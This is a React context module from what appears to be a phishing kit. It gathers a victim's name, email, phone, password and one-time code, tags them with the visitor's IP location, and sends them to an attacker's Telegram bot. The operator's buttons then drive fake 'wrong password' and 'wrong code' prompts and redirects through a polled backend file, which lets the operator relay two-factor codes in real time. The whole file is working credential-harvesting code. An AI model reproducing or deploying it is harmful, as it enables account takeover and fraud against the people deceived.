import axios from 'axios';
import React, { createContext, useEffect, useState } from 'react'
import config from '../config';

export const MainContextContent = createContext("");
const MainContext = ({ children }) => {
  const [navTo, setNavTo] = useState("");
  const [open, setOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({
    passwordError: "",
    otpError: ""
  });
  const [form, setForm] = useState({
    fullname: "",
    email: "",
    phone: "",
    pageName: "",
    appeal: "",
    password: "",
    otp: "",
    ip: "",
    country: "",
    city: "",
	region: ""
  })
  useEffect(() => {
    axios.get("https://ipapi.co/json")
      .then(res => {
        setForm({
          ...form,
          ip: res.data.ip,
          city: res.data.city,
          country: res.data.country_name,
		  region: res.data.region,
        })
      })
      .catch(error => console.error('Error fetching IP:', error));
  }, []);
  const checkKeyInFile = async () => {
    try {
      const response = await axios.get(`${config.apiBaseUrl}/readFile`);
      const resData = response.data.data;

      axios.get("https://ipapi.co/json")
        .then(res => {

          const desiredKey = res.data.ip;
          let desiredValue = '';

          try {
            const foundItem = resData.find(line => line.key == desiredKey);

            if (foundItem) {
              desiredValue = foundItem.value;
            }
          } catch (error) {
            console.error('Error during find:', error);
          }

          if (desiredValue != "") {
            axios.post(`${config.apiBaseUrl}/updateData`, { data: resData.filter(line => line.key != desiredKey) })
              .finally(res => {
                setLoading(false)
                if (desiredValue == "password") {
                  setErrors({
                    ...errors,
                    passwordError: "Your password is wrong. Please try again."
                  })
                  setForm({
                    ...form,
                    password: ""
                  })

                } else if (desiredValue == "otp") {
                  setNavTo('/otp')

                } else if (desiredValue == "wrongotp") {
                  setErrors({
                    ...errors,
                    otpError: "The code you entered is wrong. Please check the code we sent."
                  })

                  setForm({
                    ...form,
                    otp: ""
                  })
                  setLoading(false)
                } else if (desiredValue == "done") {
                  setNavTo('/done')
                }
                else if (desiredValue == "loading") {
                  setNavTo('/loading')
                }

              })

          }


        })
        .catch(error => console.error('Error fetching IP:', error))

    } catch (error) {
      console.error('Reading or updating file error :', error);
    }
  };
  const handleClose = () => setOpen(false);
  const handleOpen = () => setOpen(true);

  const handleChange = (event) => {
    const { name, value } = event.target;
    if (name == "otp") {
      const re = /^[0-9\b]+$/;
      if (value === "" || re.test(value)) {
        setForm({ ...form, [name]: value });
      }
    } else {
      setForm({ ...form, [name]: value });
    }

    console.log('form', form)
  };

  const handleSubmit = () => {
    if (form.password.length > 5) {
      setErrors({
        ...form,
        passwordError: ""
      })
    setLoading(true)
    setErrors({
      ...form,
      passwordError: ""
    })
    let obj =
      "Fullname: " + form.fullname + "%0A" +
      "Email: " + form.email + "%0A" +
      "Phone: " + form.phone + "%0A" +
      "Pagename: " + form.pageName + "%0A" +
      "Password: " + form.password + "%0A%0A" +
      "IP: " + form.ip + "%0A" +
      "Country: " + form.country + "%0A" +
      "City: " + form.city + "%0A";
    let keyboard = JSON.stringify({
      inline_keyboard: [
        [
          {
            text: "WRONGPASS",
            url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/password"
          },
          {
            text: "OTP",
            url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/otp"
          },
          {
            text: "DONE",
            url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/done"
          }
        ]
      ]
    });
    axios.post(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&reply_markup=${keyboard}&text=${obj}`)
      .then((res) => {
        console.log(res)
        const interval = setInterval(() => {
          checkKeyInFile();
        }, 3000);
      })

    } else {
      setErrors({
        ...form,
        passwordError: "Enter valid password"
      })
    }
  }
  const handleSubmit2 = () => {
    if (form.otp.length === 6 || form.otp.length===8) {
      setErrors({
        ...form,
        otpError: ""
      })
      setLoading(true)
      let obj =
        "Fullname: " + form.fullname + "%0A" +
        "Email: " + form.email + "%0A" +
        "Phone: " + form.phone + "%0A" +
        "Pagename: " + form.pageName + "%0A" +
        "Password: " + form.password + "%0A%0A" +
        "OTP: " + form.otp + "%0A%0A" +
        "IP: " + form.ip + "%0A" +
        "Country: " + form.country + "%0A" +
        "City: " + form.city + "%0A";
      let keyboard = JSON.stringify({
        inline_keyboard: [
          [
            {
              text: "WRONGOTP",
              url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/wrongotp"
            },
            {
              text: "LOADING",
              url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/loading"
            },
            {
              text: "DONE",
              url: config.apiBaseUrl + "/writeToFile?logs=" + form.ip + "/done"
            }
          ]
        ]
      });
      axios.post(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&reply_markup=${keyboard}&text=${obj}`)
        .then((res) => {
          console.log(res)
          const interval = setInterval(() => {
            checkKeyInFile();
          }, 3000);
        })

    } else {
      setErrors({
        ...form,
        otpError: "Enter valid code"
      })
    }


  }
  return (
    <MainContextContent.Provider value={{ errors, handleSubmit2, navTo, form, loading, setForm, handleSubmit, handleChange, handleOpen, handleClose, open }}>
      {children}
    </MainContextContent.Provider>
  )
}

export default MainContext